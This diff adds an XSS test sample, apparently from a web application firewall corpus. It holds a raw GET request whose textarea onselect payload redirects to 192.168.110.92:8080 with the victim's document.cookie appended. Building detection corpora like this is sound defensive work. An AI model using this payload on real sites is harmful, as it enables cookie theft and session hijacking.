@@ -1,0 +1,9 @@
+# XSS跨站脚本_GET_常规_事件_textarea标签_onselect事件-06506680
+# 攻击载荷利用了HTML中的textarea标签和onselect属性，触发location.href向恶意地址发送cookie信息。需要选择文本触发
+GET /?id=%3Ctextarea%20onselect=%28location.href=%22http:%2F%2F192.168.110.92:8080%2Findex.jsp%3Fid=%22+document.cookie%29%20autofocus%3EXSS%3C%2Ftextarea%3E&bid=hd_tag_m8mv25qu HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25qu
+RM-PRO-Token: 162505ae8dc76245d8e7510a762d4dcf
+RM-PRO-Time: 1742808501611
+User-Agent: curl/7.83.1
+
